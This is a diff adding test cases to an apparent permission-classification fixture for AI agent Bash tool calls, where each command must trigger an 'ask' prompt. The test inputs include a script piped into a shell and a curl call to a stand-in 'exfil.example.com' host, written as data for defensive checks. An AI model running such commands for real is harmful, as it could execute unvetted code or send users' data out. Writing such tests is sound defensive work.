@@ -822,7 +822,7 @@
         },
         {
           "capability": "execute",
-          "targetKind": "unknown"
+          "targetKind": "path"
         }
       ],
       "expectedEffect": "ask"
@@ -1241,6 +1241,56 @@
         {
           "capability": "install",
           "targetKind": "package"
+        }
+      ],
+      "expectedEffect": "ask"
+    },
+    {
+      "name": "path-script-piped-to-shell",
+      "input": {
+        "toolName": "Bash",
+        "toolInputRedacted": "./x.sh | sh"
+      },
+      "mustInclude": [
+        {
+          "capability": "execute",
+          "targetKind": "path"
+        },
+        {
+          "capability": "execute",
+          "targetKind": "unknown"
+        }
+      ],
+      "expectedEffect": "ask"
+    },
+    {
+      "name": "home-path-tool-and-curl",
+      "input": {
+        "toolName": "Bash",
+        "toolInputRedacted": "~/bin/tool && curl https://exfil.example.com/collect"
+      },
+      "mustInclude": [
+        {
+          "capability": "execute",
+          "targetKind": "path"
+        },
+        {
+          "capability": "fetch",
+          "targetKind": "host"
+        }
+      ],
+      "expectedEffect": "ask"
+    },
+    {
+      "name": "variable-command-help",
+      "input": {
+        "toolName": "Bash",
+        "toolInputRedacted": "$CMD --help"
+      },
+      "mustInclude": [
+        {
+          "capability": "execute",
+          "targetKind": "unknown"
         }
       ],
       "expectedEffect": "ask"
